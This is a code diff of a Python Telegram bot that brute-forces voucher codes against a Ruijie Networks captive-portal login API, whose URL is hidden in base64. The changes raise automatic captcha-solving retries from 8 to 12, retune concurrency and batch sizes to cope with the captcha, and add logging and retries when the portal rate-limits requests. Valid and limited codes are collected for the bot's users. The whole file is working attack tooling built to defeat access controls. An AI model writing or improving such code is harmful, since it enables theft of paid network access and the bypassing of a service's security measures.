@@ -1,6 +1,6 @@
 # ═══════════════════════════════════════════════════════════════════════════
-#  VOUCHER BOT — Merged Version (Admin: 1626617395)
-#  Best of both: keyboard menu + command interface + GitHub persistence
+#  VOUCHER BOT — Ruijie Captcha Update Support
+#  Admin: 1626617395
 # ═══════════════════════════════════════════════════════════════════════════
 import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 import logging
@@ -28,10 +28,7 @@ GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
 
-# Extra admins (optional)
-ADMINS_EXTRA = [
-    # "123456789",
-]
+ADMINS_EXTRA = []
 
 if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN env variable is required")
@@ -48,21 +45,21 @@ GITHUB_ENABLED = all([GITHUB_TOKEN, REPO_OWNER, REPO_NAME])
 bot = AsyncTeleBot(BOT_TOKEN)
 
 # ─── Global state ─────────────────────────────────────────────────────────
-user_data        = {}   # {chat_id: {"session_url": str}}
-scan_tasks       = {}   # {chat_id: {"task", "stop", "scan_id"}}
-success_texts    = {}   # {chat_id: [{"code","session_id","plan"}]}
-limited_texts    = {}   # {chat_id: [code, ...]}
-notify_setting   = {}   # {chat_id: bool}
-last_scan_params = {}   # {chat_id: {"mode","length","target"}}
-pending_brute    = {}   # {chat_id: {"mode","length"}}
-success_messages = {}   # {chat_id: message_id}
-limited_messages = {}   # {chat_id: message_id}
+user_data        = {}
+scan_tasks       = {}
+success_texts    = {}
+limited_texts    = {}
+notify_setting   = {}
+last_scan_params = {}
+pending_brute    = {}
+success_messages = {}
+limited_messages = {}
 
 SUCCESS_CODE = asyncio.Queue()
 
 session    = None
 _connector = None
-CONCURRENCY  = 300
+CONCURRENCY  = 200          # ← Captcha ကြောင့် လျှော့ထားသည်
 _voucher_sem = None
 _start_time  = time.monotonic()
 
@@ -70,7 +67,7 @@ MAX_CONCURRENT_SCANS = 5
 active_scans_count   = 0
 active_scans_lock    = asyncio.Lock()
 
-BATCH_SIZE = 500
+BATCH_SIZE = 200            # ← Captcha ကြောင့် လျှော့ထားသည်
 
 BRUTE_MODES = {
     "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
@@ -80,7 +77,7 @@ BRUTE_MODES = {
     "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
 }
 
-# ─── Proxy (disabled — direct connection) ────────────────────────────────
+# ─── Proxy (disabled) ─────────────────────────────────────────────────────
 PAID_PROXIES = []
 _proxy_index = 0
 def get_next_proxy():
@@ -370,7 +367,7 @@ async def check_session_url(session_url):
         logger.error(f"check_session_url: {e}")
         return False
 
-# ─── Core voucher check ──────────────────────────────────────────────────
+# ─── Core voucher check (with captcha retry) ─────────────────────────────
 POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
@@ -394,8 +391,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
             if not session_id:
                 continue
 
+            # ── Captcha: 12 retries with fresh image each time ──
             auth_code = None
-            for _ in range(8):
+            for _ in range(12):
                 try:
                     img  = await Captcha_Image(ts, session_id)
                     text = await Captcha_Text(img)
@@ -405,6 +403,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 except Exception:
                     continue
             if not auth_code:
+                logger.warning(f"Captcha failed for session {session_id}, code={code}")
                 continue
 
             if not recheck:
@@ -432,6 +431,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 return None
 
         if response and "request limited" in response:
+            logger.warning(f"Rate limited on code={code}, retrying with new captcha ({attempt+1}/3)")
             await asyncio.sleep(2)
             continue
         break
@@ -439,7 +439,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
     if not response:
         return None
 
-    # ── SUCCESS ─────────────────────────────────────────────────────
+    # ── SUCCESS ──
     if "logonUrl" in response:
         if recheck:
             return code
@@ -479,7 +479,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 pass
         return code
 
-    # ── LIMITED ────────────────────────────────────────────────────
+    # ── LIMITED ──
     elif "STA" in response:
         limited_texts.setdefault(chat_id, [])
         if code not in limited_texts[chat_id]:
